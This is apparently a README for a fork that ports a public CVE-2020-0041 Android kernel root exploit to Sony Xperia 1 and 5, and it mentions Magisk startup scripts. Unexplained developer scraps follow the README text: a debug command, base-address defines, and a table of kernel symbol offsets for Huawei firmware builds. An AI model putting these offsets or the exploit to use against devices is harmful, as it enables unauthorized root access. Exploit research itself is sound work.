# CVE-2020-0041

This repository contains LPE code for exploiting CVE-2020-0041 implemented by bluefrostsecurity as released at https://github.com/bluefrostsecurity/CVE-2020-0041/tree/master/lpe .
The exploitation approach for this part can be found at https://labs.bluefrostsecurity.de/blog/2020/04/08/cve-2020-0041-part-2-escalating-to-root/ .

This forked repository shall host ports for other kernels / devices in their specific branches.
Big thanks to bluefrostsecurity for their awesome writeup and the exploit release.

# CVE-2020-0041 LPE port for sony xperia 1 and 5

The original lpe has been designed for kernel 4.9 of Google Pixel 3.
This is a port for kernel 4.14 used with sony xperia 1 and 5.

# Scripts to startup magisk from temp root

Implemented special hack to allow magisk startup from the exploit, including working su permission asking notification in android.
You can find it in the 'scripts' subdirectory.
export aaddr2line=/Users/mac/Library/Android/sdk/ndk-bundle-21/toolchains/arm-linux-androideabi-4.9/prebuilt/darwin-x86_64/bin/arm-linux-androideabi-addr2line

$aaddr2line –e  ./libs/arm64-v8a/CVE-2020-0041 00004de8 000056c8 00004fb4 00004f58
#define  _head_ADR_0 0x02f256a002f25698  //02f256a002f25698 _head
#define  _head_ADR_1 0x0000000002f505e0


   { 
        "GLK-AL00-GLK-AL00 9.1.0.143(C00E135R3P1)", 
        0x28F3000, 
        0x02f256a0042a5730-_head_ADR_0,
        0x02f256a0050f6da8-_head_ADR_0,
        0x02f256a002f5c724-_head_ADR_0,
        0x02f256a0050c4290-_head_ADR_0, 
        0x02f256a0050d1a68-_head_ADR_0,
        0x02f256a0042c6cd8-_head_ADR_0
    },
    { 
        "GLK-AL00-GLK-AL00 9.1.0.125(C00E120R1P8)", 
        0x28F3000, 
        0x00000000042d0680-_head_ADR_1,
        0x0000000005121d20-_head_ADR_1,
        0x0000000002f877d0-_head_ADR_1,
        0x00000000050ef220-_head_ADR_1, 
        0x00000000050fc9d8-_head_ADR_1,
        0x00000000042f1c48-_head_ADR_1
    },


    华为不存在因为没有使用kasan编译